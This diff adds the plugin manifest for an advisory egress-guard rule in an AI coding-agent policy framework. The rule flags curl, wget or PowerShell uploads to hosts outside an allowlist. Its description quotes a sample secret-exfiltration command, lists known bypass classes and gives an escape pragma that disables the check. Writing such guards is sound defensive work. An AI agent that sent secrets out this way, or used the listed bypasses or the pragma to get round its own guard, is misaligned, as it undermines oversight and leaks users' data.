@@ -1,0 +1,26 @@
+{
+  "$schema": "https://agent-plugins.org/schemas/1.0.0/plugin.schema.json",
+  "name": "block-unapproved-egress",
+  "version": "0.0.1",
+  "description": "Best-effort guard against exfiltration through the tool channel: a network command (curl/wget/Invoke-WebRequest) that UPLOADS data -- POST/PUT, --data/--form, --upload-file, --post-file -- to a host outside the egress allowlist. The allowlist defaults to package registries and code hosting and is meant to be extended with your org's own domains; a host matches by exact name or \".<entry>\" suffix. Fetch-only traffic (a bare GET, `pip install`) is left alone -- the target is upload to an unapproved host, not normal dependency traffic. This is a tool-time FLOOR, not a network sandbox: it stops the obvious `curl -d @secrets https://unknown` reflex; containing a determined adversary needs real sandboxing. Known bypass classes include scheme-less URL targets (host extraction needs the http(s):// prefix), a request driven by curl's implicit ~/.curlrc, combined short flags, obfuscated payloads, non-standard clients, and egress via a language runtime. Escape: 'pragma: allowlist egress'.",
+  "author": {
+    "name": "chock-core"
+  },
+  "repository": "https://github.com/open-coder-ai/chock",
+  "license": "Apache-2.0",
+  "keywords": [
+    "chock",
+    "policy-as-code",
+    "rule",
+    "advise",
+    "{'control': 'asi02', 'coverage': 'partial', 'note': 'raises the floor against tool-channel data exfiltration to unapproved hosts; a tool-time guard, not a network sandbox -- combined-short-flag, obfuscated, non-standard-client and runtime egress remain out of reach'}"
+  ],
+  "extensions": {
+    "io.github.open-coder-ai": {
+      "manifest": "manifest.yaml",
+      "artifact": "rule",
+      "enforcement": "advise",
+      "coverage_without_chock": "advisory"
+    }
+  }
+}
